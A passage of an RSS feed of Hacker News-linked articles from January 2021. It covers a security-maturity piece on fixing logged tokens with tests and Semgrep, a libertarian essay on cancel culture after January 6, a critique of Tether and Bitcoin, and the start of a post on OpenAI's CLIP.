<p>This is (unfortunately) how many organizations operate. Nobody really works together: Security is off in one corner looking for vulnerabilities (or, worse, waiting for a breach and then responding!). When they find one, they tell Engineering, who (hopefully) fixes the problem.</p>
<p>Let’s begin the example and see how this could shake out in practice. A few months ago, Nathan Brahams <a href="https://r2c.dev/blog/2020/fixing-leaky-logs-how-to-find-a-bug-and-ensure-it-never-returns/" target="_blank" rel="noopener">wrote about systemically fixing an issue around accidentally logging sensitive tokens</a>. His article illustrates the steps a quite mature security/engineering organization would take, but I’ll use this issue as a jumping-off-point to imagine how teams earlier in their journey might approach discovering a similar issue.</p>
<p>So, imagine a budding team has found this security issue: SQLAlchemy debug logging is turned on and sensitive tokens are being logged. The issue is fixed with a clever technique that uses a custom <code>ObfuscatedString</code> column that prevents SQLAlchemy from logging the token's value. So, we just swap in <code>ObfuscatedString</code> for the token column. Problem solved, right?</p>
<p>Well, while this does fix the issue, it has many problems:</p>
<ul>
<li><strong>Verification</strong>: If Engineering just rolls out this fix, how do we verify that the issue is actually fixed? Usually at this level of maturity, the Security team will manually verify the fix, but that’s error-prone. It’s also slow; if the fix didn’t work or is incomplete, the cycle has to repeat itself.</li>
<li><strong>Regression</strong>: If another engineer, some time later, doesn’t understand this <code>ObfuscatedString</code>, it could get reverted or modified in a way that re-introduces the issue. How would we know if this happens? (Spoiler alert: with an automated test, which we’ll discuss in the next section.)</li>
<li>Is this a one-off issue, or <strong>is it a systemic issue</strong>? Are there other sensitive values elsewhere that might be logged?</li>
<li><strong>Conflict</strong>: Most importantly, this workflow sets up conditions ripe for conflict between Security and Engineering. It creates a dynamic where it’s easy for Engineering to feel like Security’s just creating work for them, and where Security can feel ignored or powerless to fix problems. I’ve never seen this model produce a really healthy relationship; just ones with varying levels of dysfunction. Even when Security helps write the fix, the lack of any sort of robust verification or systemic analysis means it’s very likely they’ll need to come back later with this issue or a similar one again, which both parties will resent.</li>
</ul>
<h3>Level 2: automated tests</h3>
<p>The next rung on the maturity ladder is one that’s becoming increasingly common: instead of just fixing a security issue, Security and Engineering will collaborate on producing a test case (and often the fix). Following along with the example above, we might write a test case that sets up a test model with an <code>ObfuscatedString</code> column, captures some logs, and verifies that the value is correctly obfuscated.</p>
<p>This relatively simple addition fixes a bunch of problems we had before:</p>
<ul>
<li><strong>Verification</strong>: If the test case passes, we can be confident the security issue is fixed.</li>
<li><strong>Regression</strong>: Because this test case is part of our test suite, if it ever regresses the test case will fail, and we won’t risk re-introducing it to production.</li>
<li><strong>Collaboration</strong>: Security and Engineering are now working more closely together, increasing the chances both teams will see this as “our issue” and “our fix”, not “their problem”.</li>
</ul>
<p>But: we still lack any sort of understanding of whether this issue occurs elsewhere, or any sort of holistic fix for the entire class of issues. In the case of logging sensitive tokens, it’s easy to imagine this issue occurring elsewhere. So when — inevitably — a similar issue occurs elsewhere, we’re likely to be bitten again. And this, in turn, will continue to produce the kind of resentment that can be so damaging to Security/Engineering working well together.</p>
<h3>Level 3: systemic fixes and checks</h3>
<p>The next step, then, is for Security and Engineering to work together to find systemic problems and fixes. Things start out as above — it’s important to fix the specific vulnerability first, before getting fancy! But after the specific fix is in, Security and Engineering come together to figure out if this is a systemic problem. If so, they work to develop a check or a fix.</p>
<p>Sometimes this can be a fairly simple holistic fix. For example, <a href="https://r2c.dev/blog/2020/understanding-and-preventing-dos-in-web-apps/" target="_blank" rel="noopener">I wrote about ReDoS last time</a>. Discovery of a ReDoS vulnerability might lead to discovering other similar potential problems. That in turn could lead to the decision to switch to <a href="https://github.com/google/re2" target="_blank" rel="noopener">re2</a>, which isn’t vulnerable to ReDoS.</p>
<p>But much of the time, the systemic fix is more complex — there isn’t a simple drop-in replacement that eliminates a class of vulnerabilities. That’s true of this sensitive-logging issue: we don’t have any sort of logging module that can magically know when variables are sensitive, and obfuscate them.</p>
<p>This is where code scanning tools like Semgrep come in. They are a terrifically important part of a mature product security workflow. Traditional testing practices — unit tests, integration tests, etc — are great for reproducing specific security issues, and ensuring that they’re fixed and won’t regress. But they struggle to discover whole classes of security issues, and this is what code scanners enable. Traditional code linters (e.g., Flake8, RuboCop) help to ensure code consistency and find some common issues, but since they have to apply generally to all kinds of projects, they tend to only provide a one-size-fits-all best-practices check. Tools that understand code semantically, like Semgrep, can be used to write tests for <em>your unique codebase</em> and find whole classes of security issues — including, most importantly, new instances of a problem that might be added after the check has been written.</p>
<p>And indeed, that’s what Nathan and his team did: they wrote a Semgrep rule that finds columns with names suggesting they’re sensitive (e.g., containing “token”, “secret”, “key”, etc), and issues a warning.</p>
<p>At this point, we’re in a pretty good spot. New code is continually scanned for this issue, and when found, they are fixed robustly. We have a workflow and tooling that ensures that the original, specific issue is fixed and that it stays fixed, and we ensure that similar issues — present and future — are discovered and fixed. Security and Engineering collaborate on this work, which is now well-automated. There’s still (of course) room for teams to not get along, but we’ve removed some of the most common pain points (verification, regression, conflict between teams).</p>
<p>If suddenly blocking builds with new checks will only increase conflict in your organization, you could softly roll out checks that do not block Engineering and only notify Security. For issues that arise, Security can begin conversations with Engineering to collaborate on both specific and systemic fixes. Once the check is satisfactory to both …</p></div></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://r2c.dev/blog/2021/four-levels-of-maturity-that-bridge-the-app-sec-engineering-divide/">https://r2c.dev/blog/2021/four-levels-of-maturity-that-bridge-the-app-sec-engineering-divide/</a></em></p>]]>
            </description>
            <link>https://r2c.dev/blog/2021/four-levels-of-maturity-that-bridge-the-app-sec-engineering-divide/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25688143</guid>
            <pubDate>Fri, 08 Jan 2021 18:40:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Cultural Purge Is Now in Overdrive]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25688127">thread link</a>) | @StuntPope
<br/>
January 8, 2021 | https://outofthecave.io/articles/the-cultural-purge-is-now-in-overdrive/ | <a href="https://web.archive.org/web/*/https://outofthecave.io/articles/the-cultural-purge-is-now-in-overdrive/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p><a href="https://outofthecave.io/articles/the-cultural-purge-is-now-in-overdrive/#comments">
			20 <span></span>
		</a></p>
		
		
				<p><img loading="lazy" src="https://outofthecave.io/wp-content/uploads/2021/01/burned_at_the_stake.jpg" alt="" width="600" height="437" srcset="https://outofthecave.io/wp-content/uploads/2021/01/burned_at_the_stake.jpg 600w, https://outofthecave.io/wp-content/uploads/2021/01/burned_at_the_stake-300x219.jpg 300w, https://outofthecave.io/wp-content/uploads/2021/01/burned_at_the_stake-150x109.jpg 150w, https://outofthecave.io/wp-content/uploads/2021/01/burned_at_the_stake-65x47.jpg 65w, https://outofthecave.io/wp-content/uploads/2021/01/burned_at_the_stake-220x160.jpg 220w, https://outofthecave.io/wp-content/uploads/2021/01/burned_at_the_stake-137x100.jpg 137w, https://outofthecave.io/wp-content/uploads/2021/01/burned_at_the_stake-358x261.jpg 358w, https://outofthecave.io/wp-content/uploads/2021/01/burned_at_the_stake-549x400.jpg 549w" sizes="(max-width: 600px) 100vw, 600px"></p>
<p>Four years ago, after the unthinkable happened and the wrong guy won the US election of 2016. <a href="https://easydns.com/blog/2017/02/24/the-cultural-purge-will-not-be-televised/">I wrote an article</a> about how I had feared a type of “cultural purge” from within the corporate media, Big Tech and cancel culture spheres. Like everybody else, I didn’t expect Trump to win (like most other Libertarians, I was holding my nose and pulling for Gary Johnson, whose running mate, Bill Weld, endorsed Hillary Clinton <em>during the election campaign).</em></p>
<p>What I expected then, after Trump would have unceremoniously lost the 2016 election,&nbsp; was a type of cultural purge against anybody and everybody who enabled his run or supported him. What surprised me was that after he won the cultural purge proceeded anyway. In retrospect it seems obvious, at the time it blindsided me.<span id="more-1501"></span></p>
<p>For the next four years we watched any (remaining) semblance of objectivity and impartiality wither away from the mainstream media. Even more troubling, was that it was also happening within<em>&nbsp;</em>Big Tech. Everything polarized and all judgement calls became characteristically asymmetrical. As I noted on occasion, that compared to the post 9/11 era when the Neocons controlled the narrative and the word “liberal” was a slur, everything flipped. Now it was the word “conservative” that was unusable and being a single micron to the right of centre was equated with being “literally Hitler”.</p>
<p>I could list the countless examples of deplatformings, cancellations, character assassinations and careers destroyed in the intervening time. It became so ridiculous, so devoid of any attempt at a claim to due process or fairness that an entire counter-culture has formed around criticizing or ridiculing it. <a href="https://easydns.com/blog/2019/10/22/unassailable-the-book-that-protects-you-from-cancel-culture-and-deplatform-attacks/">I wrote a book</a> about <a href="https://easydns.com/blog/2019/10/22/unassailable-the-book-that-protects-you-from-cancel-culture-and-deplatform-attacks/">defending from deplatform attacks</a>, which I started <a href="https://axisofeasy.com/aoe/the-missing-manual-for-defending-yourself-against-deplatforming-and-cancel-culture/">giving away for free</a> in April when Big Tech started deplatforming deviant reporting on the COVID-19 crisis. Babylon Bee sprang into existence and quickly rivalled The Onion, <a href="https://babylonbee.com/news/op-ed-anyone-who-claims-cancel-culture-is-real-is-a-bigot-who-should-lose-his-job">riffing on cancel culture</a> and hitting headwinds on multiple occasions when their scathing satire <a href="https://news.yahoo.com/twitter-apologizes-mistakenly-suspending-babylon-154401646.html">was indistinguishable from the reality</a> they were lampooning.</p>
<div id="attachment_1511"><p><a href="https://babylonbee.com/news/op-ed-anyone-who-claims-cancel-culture-is-real-is-a-bigot-who-should-lose-his-job"><img aria-describedby="caption-attachment-1511" loading="lazy" src="https://outofthecave.io/wp-content/uploads/2021/01/oped-e1610129919714.png" alt="" width="800" height="745"></a></p><p id="caption-attachment-1511">TL,DR: Cancel culture is a right-wing conspiracy promulgated by Qanon Incels</p></div>
<p>More than once I thought “This is it, this has to be Peak Outrage”, and then somebody else’s career or business would be destroyed, sometimes for imagined transgressions that may or may not have taken place years ago or even before the target even started a position they’d just been canceled from having (David Collum’s section on cancel culture, featuring his own cancelation, lays many of these out in his famous Year In Review series, <a href="https://www.peakprosperity.com/dave-collum-2020-year-in-review-part-2/#cancelculture">the 2020 issue</a>).</p>
<p>Once the 2020 election was finally in the rear-view mirror and it appeared likely the administration had changed I thought, once again, that the worst was over. The world was mired in lockdown fatigue, we’re not even dealing with the economic fallout of COVID yet, and “ding dong the witch is dead”. Surely cancel culture and social justice extremism would taper off, if only out of exhaustion.</p>
<blockquote>
<p dir="ltr" lang="en">i’m fucking exhausted <a href="https://t.co/gjmsQtgBFh">pic.twitter.com/gjmsQtgBFh</a></p>
<p>— Jordan Lancaster (@jordylancaster) <a href="https://twitter.com/jordylancaster/status/1316065323595034628?ref_src=twsrc%5Etfw">October 13, 2020</a></p></blockquote>

<h2>Boy am I wrong, again.</h2>
<p>The ignominy with which TheDonald has chosen to close out his term, the lack of humility, of which is he likely congenitally incapable of, will instead reignite the flames of the culture wars and propel them to new heights. As investing legend (and Fed critic) Bill Fleckinstein observed in his subscriber note yesterday, there is a right way and a wrong way to go out, even if you feel like you got shafted:</p>
<blockquote><p>On the subject of yesterday’s violence, although it is unlikely to have long-lasting economic impacts and thus is largely in the realm of politics, which I tend to avoid, I think there is a worthwhile lesson to point out. Obviously, Trump’s worst qualities, which stem from his being a petulant egomaniac, have been on display since he lost the election and I’m reminded of a very valuable lesson I learned from my investment business mentor, who told me that when you get fired by a client (yes, that happens), rather than be upset and act petulantly what you should say is, “How can I make the transition easier for you?”</p>
<p>In other words, you turn a loss into a bit of a victory by being a class act. I can’t tell you how many times over my investment career when that lesson and corollaries to it have been quite useful, and no matter what, trying to comport yourself in such a manner pays big dividends over time in my opinion.</p></blockquote>
<p>Like Fleck, I don’t even want to get into the gory details of the events of Jan 6, the storming of the capital, the riots, other than to say that when we talk about the twilight of the nation state and the rise of the Network State <a href="https://axisofeasy.com/salon">in our #AxisOfEasy podcasts,</a> these are the sort of disorderly episodes we fear punctuating or worse, defining, this oncoming societal shift.</p>
<p>We certainly seem to be <a href="https://www.goodreads.com/book/show/670089.The_Fourth_Turning">into The Fourth Turning now</a>, a book I have been rereading and was just finishing up listening to the day of the DC riots. Their prescience is creepy, especially as they outlined the “climax” phase of the Crisis period, which, by their reckoning started around… 2020 and would last another 6 to 10 years:</p>
<div>
<blockquote><p>One or both of today’s dominant parties could go the way of the Whigs…History warns that when a crisis catalyzes, a previously dominant political party or regime can find itself perceived or blamed for direct mistakes that led to the national emergency.</p>
<p>Whoever holds power when the Fourth Turning arrives could find themselves joining the ranks of the 14th century Lancastrians, circa 15th century Catholics, circa 1680 Stewarts, circa 1770 Tories, circa 1860 Democrats, and circa 1929 Republicans. That party could find itself out of power for a generation.</p>
<p>Key persons associated with it could find themselves defamed, stigmatized, harassed, economically ruined, or even personally punished”</p></blockquote>
<p>Since that day, Big Tech and corporate media moved at a new speed that I found dizzying. Twitter pile-ons are ugly enough spectacles and that’s just watching end-users gang up on the sacrificial deviant of the day. But <a href="https://www.theverge.com/2021/1/7/22218776/shopify-trump-store-disable-campaign-ecommerce-sites-capitol">watching&nbsp;<em>Shopify</em></a> of all companies, pile on to Facebook and Twitter’s deplatforming of a sitting president (which at this moment he is, like it or not), <a href="https://www.cnn.com/2021/01/07/media/josh-hawley-book-canceled/index.html">Simon and Schuster canceling their contract</a> to publish Sen Josh Hawley’s book <em>on Big Tech censorship</em> (which I wanted to read) and I’m sure the list will go on after I’m done writing, this is just fucking crazy.</p>
<p>(I paused writing this to take a meeting, an hour later I come back to finishing it off and a friend, who fled Chicago this past summer because of the complete breakdown of civil order there, among other US cities at that time, <a href="https://chicago.suntimes.com/politics/2021/1/7/22219360/trump-rally-capitol-tank-noodle-insight-studios-properties">sent me this story</a>. It outlines numerous other firings and cancelations of Chicagoans who attended the DC rally (but not necessarily involved in the violence), and businesses who even commented in social media about it.</p>
<div id="attachment_23289"><p><img aria-describedby="caption-attachment-23289" loading="lazy" src="https://axisofeasy.com/wp-content/uploads/2021/01/properties-1024x374.png" alt="" width="1024" height="374"></p><p id="caption-attachment-23289">Translation: a social media mob demanded we cancel one of our employees with zero due process or time to consider, so we did. <strong>Who do you want us to fire next?</strong></p></div>
<h2><strong><em>Think it through people.</em> </strong></h2>
<p>Do you want to live in a society where Facebook and Twitter decide not only what is <em>permissible</em> to say but even <em>which narratives can be explored</em> and which ones can’t?</p>
<p>Yes I know, “private companies, their own AUP, blah blah blah” – I’m a libertarian and a tech company CEO, so I know all this. I’ll preempt these objections with what I said in my book, which is that when tech companies base platform/deplatform decisions on something that is happening&nbsp;<em>outside&nbsp;</em>of their platforms, they are in effect, exercising jurisprudence and adjudicating international law. All any company can competently assess is what is happening on within their respective platforms, how their employees are fulfilling their roles and serving the businesses customers <em>and nothing else.</em></p>
<p>Would you be ok with your employer firing you if enough strangers who don’t know you, don’t do business with your company and have no first hand knowledge of events or what your circumstances are scream at your boss to cut you loose?</p>
<p>Do you want contracts to be subject to negation by&nbsp; public sentiment of events 2 or 3 or more degrees separated from the contracted parties?</p>
<p>Do you want to have every aspect of your life scrutinized by somebody else’s measure of moral and ideological purity before you can say anything online? How about before you can book a hotel room? Fill up your car with gas? Go shopping? Get on a plane?</p>
<p>After all, we have big data and AI now, <em>so this is all doable.&nbsp;</em></p>
<p>Do you really want to live within the constraints of a type of societal social credit system where your every action, <em>your very thoughts</em> are bounded by external and ever shifting, subjective and <a href="https://outofthecave.io/articles/merriam-webster-modifies-word-definition-after-left-manufactures-offensive-meaning-for-it/">revisionist social mores</a>? Many of them defined by the most oversensitive, self-absorbed hysterics on social media?</p>
<p>Be very careful if you think this is a good thing, because sooner or later, you’re going to be on the wrong side of it. By then it’ll be too late.</p>


</div>
<p><a href="#" rel="nofollow" onclick="window.print(); return false;" title="Printer Friendly, PDF &amp; Email"><img src="https://cdn.printfriendly.com/buttons/printfriendly-button.png" alt="Print Friendly, PDF &amp; Email"></a></p>
			</div></div>]]>
            </description>
            <link>https://outofthecave.io/articles/the-cultural-purge-is-now-in-overdrive/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25688127</guid>
            <pubDate>Fri, 08 Jan 2021 18:40:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Tether Press and Bitcoin’s Speculative Mania]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25687847">thread link</a>) | @dgellow
<br/>
January 8, 2021 | http://www.tr0lly.com/bitcoin/the-tether-press-and-bitcoins-speculative-mania/ | <a href="https://web.archive.org/web/*/http://www.tr0lly.com/bitcoin/the-tether-press-and-bitcoins-speculative-mania/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-487">
	
	<div>
		
<p>Tether has become a plain old fiat central bank, issuing new USDTs against debt. USDTs are backed, but not by US dollars. They are backed by promises to make good on their debts by the receivers of newly minted USDTs.</p>



<p>While it’s not fraudulent per se, the fact that USDTs aren’t backed by US dollars opens the door to unlimited USDT printing. The gatekeepers are the people in charge of the Tether printing press. In an ideal world, they should ensure that proper reserve requirements are met and that the receivers of newly minted USDTs are properly capitalised.</p>



<p>However, Bitcoin’s exponential price rise, happening in lockstep with ever-increasing USDT issuance, shows that the Tether press has gone in overdrive. When the mania will end, crypto investors will lose everything, in a second.</p>



<h2>The Tetheral Reserve</h2>



<p>Long gone are the days when Tether claimed that USDTs were backed by cash. Its own website states:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-10.18.26.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-10.18.26.png 659w, http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-10.18.26-300x41.png 300w" sizes="(max-width: 659px) 100vw, 659px"><figcaption>source: tether.to/legal</figcaption></figure>



<p>It’s not necessarily a bad thing for the crypto ecosystem that Tether doesn’t have cash on hand to the amount of USDTs issued. First off, that would be a central point of failure. Tether the institution is currently under investigation, USDTs are used for money laundering, and having $20 billion in a bank account would expose you to having your assets frozen – as has <a href="https://www.coindesk.com/bitfinex-files-for-subpoena-in-bid-to-recover-880-million-in-frozen-funds">already happened in the past</a>.</p>



<p>It’s much more practical to have all your assets in loans to counterparties, from a solvency and operational point of view. The problem is, of course, that is exposes you to:</p>



<h3>Liquidity risk</h3>



<p>The role of USDTs is to replace US dollars in the crypto ecosystem. USDTs are much easier to transfer, because you don’t have to deal with a bank that will ask you all sorts of questions about the origins of the funds, the purpose of the transfer, and the identity of the receiver. In short, you don’t have to bother with AML (“anti money laundering”), KYC (“know your client”), and capital controls regulations. In shorter, USDTs empower you to launder money.</p>



<p>But as much as USDTs are more practical than US dollars, their usage requires convertibility. We live in the real world where nobody accepts USDTs as payment, and you need to be able to cash out your USDTs for real money. You can do this by buying Bitcoin with USDTs on an exchange that trades the BTC/USDT pair, wiring them to an exchange that trades the BTC/USD pair, and cash out. Or, if you are a big player, you can go to a crypto OTC desk and sell your USDTs directly for cash:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-10.33.42-1024x277.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-10.33.42-1024x277.png 1024w, http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-10.33.42-300x81.png 300w, http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-10.33.42-768x208.png 768w, http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-10.33.42.png 1038w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>source: https://www.coindesk.com/tether-usdt-russia-china-importers</figcaption></figure>



<p>This act of financial hot potato, where someone else buys your USDTs, works for as long as the crypto bull run goes on. However, you need a backstop for when things go south, namely, when people suddenly stop wanting to acquire USDTs, and want to cash out for real money. Then, someone has to redeem the USDTs for cash, and that someone should be the issuer: Tether.</p>



<p>If Tether doesn’t have enough cash on hand to process redemption requests, you have a good old liquidity crunch, when panic sets in, and people start dumping their USDT holdings en masse, for whatever price of thing they can get in exchange. Much like a real world financial crisis.</p>



<h3>USDT redemptions?</h3>



<p>Tether’s willingness to redeem USDTs for real money has been questioned over the last few years, not least because it seems that they’ve ever barely done it, as the number of USDTs outstanding never goes down:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-10.41.33.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-10.41.33.png 946w, http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-10.41.33-300x104.png 300w, http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-10.41.33-768x266.png 768w" sizes="(max-width: 946px) 100vw, 946px"><figcaption>USDT market cap, source: coin360</figcaption></figure>



<p>Note that the dip in October 2018 was due to Tether loaning $850m to Bitfinex, not actual redemptions.</p>



<p>Other reasons to question Tether’s willingness to redeem USDTs are the fact that, well, a lot of people couldn’t get Tether to redeem them, despite Tether’s own assurances that proper mechanisms were in place. Moreover, Tether’s own handling of this “FUD” has been anecdotal and shady:</p>



<blockquote>— Paolo Ardoino (@paoloardoino) <a href="https://twitter.com/paoloardoino/status/1346101912677048320?ref_src=twsrc%5Etfw">January 4, 2021</a></blockquote> 



<p>In the tweet above, the CTO of Tether shares “proof” that USDTs can be redeemed. However, the “proof” is just a list of USDT transactions to and from Bitfinex supposedly performed by an OTC desk, and without a matching set of USD transactions, it means nothing. The original question was, after all:</p>



<blockquote><p lang="en" dir="ltr">If anyone…anywhere….has redeemed USDT for USD and can show proof of this transaction I would be happy to compensate you for your time and effort. Thanks! <a href="https://t.co/wScl7s1ZAc">https://t.co/wScl7s1ZAc</a></p>— Santiago Capital (@SantiagoAuFund) <a href="https://twitter.com/SantiagoAuFund/status/1345970353747578882?ref_src=twsrc%5Etfw">January 4, 2021</a></blockquote> 



<p>Notice the “redeem <strong>for USD</strong>” part that gets ignored by Tether. Yup.</p>



<h2>The mother of all speculative manias</h2>



<p>Remember the real estate bubble of 2003-2007? How people who could barely pay their bills would buy five condos, see their price go up as other people would also buy five condos, and everyone would seemingly get rich out of thin air, together? The reasons for that bubble, in short, were lax lending requirements. A more complete explanation was that banks found ways (thanks to securitisation, reverse engineering credit rating agency rulebooks, and shadow banking) to issue mortgages to people who should have never, ever, qualified for those mortgages. As more mortgages were issued, housing prices went up, in a seemingly infinite loop.</p>



<h3>Infinite money</h3>



<p>Fiat money is issued against debt. I come into a bank, ask for $10,000, and the bank gives me the money in exchange of me acknowledging that I owe the bank $10,000 – plus interest.</p>



<p>Why can’t I come into a bank and ask for $10,000,000,000? Because banks have rules governing how much they can lend and to whom. The first rule is common sense: if customers aren’t able to repay their loans, the bank will go bust, and because the bank doesn’t want to go bust, it will only lend to people whom it deems creditworthy.</p>



<p>Other rules are regulatory. Banks must have adequate capital to absorb losses on their loan portfolio. It means that their assets must exceed their loans, and the riskier the loans, the larger that excess must be. Banks must also perform maturity matching – meaning that their sources of funding can’t be all short term, when they’re underwriting 30 year mortgages. Then there is risk weighting of assets, Basel II capital frameworks, etc., etc. Just look at this monstruosity:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/01/IRB_Basel2.jpg" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/01/IRB_Basel2.jpg 577w, http://www.tr0lly.com/wp-content/uploads/2021/01/IRB_Basel2-300x265.jpg 300w" sizes="(max-width: 577px) 100vw, 577px"><figcaption>Banking is complicated<br></figcaption></figure>



<p>There are many, many, many rules in place that are intended to prevent bubbles and manias. Despite the meme that “banks print fiat out of thin air”, they don’t – because of those rules. If they did, you’d have a new tulip bulb mania on every Thursday, and civilisation would collapse before summer.</p>



<h3>Infinite almost-money</h3>



<p>What rules are in place at Tether? What prevents them from printing USDTs out of thin air, without any rules? What prevents Binance from calling Tether and asking for 10,000,000,000 USDTs?</p>



<p>At first glance, the answer is: reality. Were Tether to issue too many USDTs, and start buying BTC and ETH and XRP with it, the price of USDT would get below $1. This has happened in the past, albeit for short periods of time.</p>



<p>But the USDT peg has remained exceptionally stable throughout 2020, despite the greatest financial and economic crisis in recent memory. Exchanges are maintaining the USDT peg, because their very existence depends on it. And USDT has replaced USD  in the crypto ecosystem, they cannot allow it to fail. They have USDT on their books. More importantly, their clients own USDT, and account for it as if it were real US dollars. Should USDT’s price fall, people would sell other cryptocurrencies as well, because they’d need to make up for the lost USDT liquidity – and the whole crypto ecosystem would collapse.</p>



<p>Remember, there is a very real need for USDTs, as long as they are pegged to the US dollar, and can be used for immediate, KYC and AML – free transactions.</p>



<p>The USDT/USD peg is founded on the premise that people won’t try to cash out en masse. As long as they don’t, USDT printing can continue.</p>



<h3>Creating value out of thin air</h3>



<p>Bitcoin doesn’t have intrinsic value. Seriously, it doesn’t. It has no use case (transactions don’t create sustainable demand – you buy Bitcoin, transact, and the other party sells it, a few minutes later), produces no cash flows, gives you no rights or claims. It’s always been a confidence game.</p>



<p>How do you create confidence?</p>



<blockquote><p lang="en" dir="ltr">If the higher demand is self-sustaining without manipulation then the manipulation actually bootstrapped genuine value. Maybe like an entrepreneur who aggressively exaggerates the state of development of a project and raises funds but then creates the product and justifies value</p>— Ari Paul ⛓️ (@AriDavidPaul) <a href="https://twitter.com/AriDavidPaul/status/965744440303374342?ref_src=twsrc%5Etfw">February 20, 2018</a></blockquote> 



<p>As long as things go up, and people don’t see any reason why they should stop, things will continue going up. Of course, people at large are unreliable, and they could stop thinking that things will continue going up, because there’s a huge economic crisis, for example. Then things go down very fast:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-11.33.12.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-11.33.12.png 597w, http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-11.33.12-300x241.png 300w" sizes="(max-width: 597px) 100vw, 597px"><figcaption>Bitcoin’s price crash during the COVID-19 rout in March 2020</figcaption></figure>



<p>Had this selling been allowed to continue, there wouldn’t be a crypto ecosystem left to speak of, today. This is why Tether and the exchanges came together and crossed the Rubicon, and decided to create USDT liquidity to stop the selling, by minting a huge 1.6 BILLION USDTs on March 31, 2020, and distributing it across main exchanges.</p>



<p>And it worked. The Tetheral Reserve was born – an infinite pool of USDT liquidity, backed by the exchanges themselves, who committed to hold the USDT/USD peg, in order to save the crypto ecosystem.</p>



<h3>To infinity, and beyond</h3>



<p>Since that fateful day nine months ago, the Tether press has been picking up speed. As the price of Bitcoin increases, the confidence in the crypto ecosystem rises to new highs, and people don’t bother to question the exponential rise of USDTs outstanding. First of, because the mainstream media doesn’t talk about it – only about the rise of Bitcoin’s price. Then, because insiders themselves …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.tr0lly.com/bitcoin/the-tether-press-and-bitcoins-speculative-mania/">http://www.tr0lly.com/bitcoin/the-tether-press-and-bitcoins-speculative-mania/</a></em></p>]]>
            </description>
            <link>http://www.tr0lly.com/bitcoin/the-tether-press-and-bitcoins-speculative-mania/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25687847</guid>
            <pubDate>Fri, 08 Jan 2021 18:22:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to try CLIP: OpenAI's new universal zero-shot image classifier]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25687532">thread link</a>) | @yeldarb
<br/>
January 8, 2021 | https://blog.roboflow.com/how-to-use-openai-clip/ | <a href="https://web.archive.org/web/*/https://blog.roboflow.com/how-to-use-openai-clip/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              <div>
                <div><p>Earlier this week, OpenAI dropped a bomb on the computer vision world: two new groundbreaking models that hint at what's to come as massive GPT3-esque Transformer models encroach on the vision domain. While <a href="https://openai.com/blog/dall-e/">DALL-E</a> (a model that can generate images from text prompts) has garnered much of the attention this week, this post focuses on <a href="https://openai.com/blog/clip/">CLIP</a>: a zero-shot classifier which is arguably even more consequential.</p><p>Until now, <a href="https://blog.roboflow.com/custom-resnet34-classification-model/">classifying images</a> has involved collecting a custom dataset of hundreds, thousands, or even millions of labeled images that suitably represent your targeted classes and using it to train a supervised classification model (usually a convolutional neural network). This approach (and extensions of it like <a href="https://blog.roboflow.com/object-detection/">object detection</a>) has led to the rapid proliferation of computer vision over the past decade (powering everything from <a href="https://blog.roboflow.com/self-driving-car-dataset-missing-pedestrians/">self driving cars</a> to <a href="https://blog.roboflow.com/designing-augmented-reality-computer-vision-apps/">augmented reality</a>).</p><p>The downside of supervised training is that the resultant models do not generalize particularly well. If you show them an image from a different domain, they usually do no better than randomly guessing. This means you need to curate a wide variety of data that is sufficiently representative of the exact task your model will perform in the wild.</p><h2 id="enter-openai-clip">Enter OpenAI CLIP</h2><p>The recent introduction of <a href="https://openai.com/blog/clip/">CLIP</a> (Contrastive Language-Image Pre-training) has disrupted this paradigm. It's a zero-shot model, meaning it can identify an enormous range of things it has never seen before.</p><figure><img src="https://blog.roboflow.com/content/images/2021/01/Screen-Shot-2021-01-08-at-12.55.41-PM.png" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2021/01/Screen-Shot-2021-01-08-at-12.55.41-PM.png 600w, https://blog.roboflow.com/content/images/size/w1000/2021/01/Screen-Shot-2021-01-08-at-12.55.41-PM.png 1000w, https://blog.roboflow.com/content/images/2021/01/Screen-Shot-2021-01-08-at-12.55.41-PM.png 1367w" sizes="(min-width: 720px) 720px"><figcaption>CLIP is like the best AI caption writer. It's able to say what is in an image from 